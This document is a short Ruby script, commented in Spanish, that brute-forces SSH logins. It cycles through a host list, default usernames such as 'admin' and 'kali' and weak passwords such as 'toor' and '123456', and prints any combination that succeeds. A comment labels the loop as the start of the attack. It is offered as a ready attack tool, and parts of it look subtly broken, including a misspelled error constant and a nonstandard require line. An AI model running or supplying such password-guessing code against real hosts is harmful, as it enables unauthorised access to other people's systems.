require 'net-ssh'

def attack_ssh(host, user, password,port=22, timeout=5)
  begin
    Net::SSH.start(host, user, :password => password,
      :auth_methods => ["password"], :port => port,
      :non_interactive => true, :timeout => timeout) do |session| # :paranoid => false, 
      puts "Password Found: #{host} | el user: #{user} | el password: #{password}"
      
    end
    # Manejador de errores que se pueden presentar:
  rescue Net::SSH::ConnectionTimeout
    puts "[!] el host '#{host}' no está vivo :( "
  rescue Net::SSH::Timeout
    puts "[!] El host: '#{host}' se enuentra desconectado"
  rescue Errno::ECONNREFUSE
    puts "[!] Puerto: '#{port}' incorrecto para el host: #{host} :( "
  rescue Net::SSH::AuthenticationFailed
    puts "Wrong Password: #{host} | el user: #{user} | el password: #{password} :( "
  rescue Net::SSH::Authentication::DisallowedMethod
    puts "El host #{host} no acepta la contraseña de autenticación :( "
  end
end

# pasar lista de posibles contraseñas:

hosts = ['192.168...']
users = ['admin', 'user', 'kali']
pass = ['toor', '123456', 'admin']

# comienza el ataque:
hosts.each do |host|
  users.each do |user|
    pass.each do |pas|
      attack_ssh host, user, pas
    end
  end
end
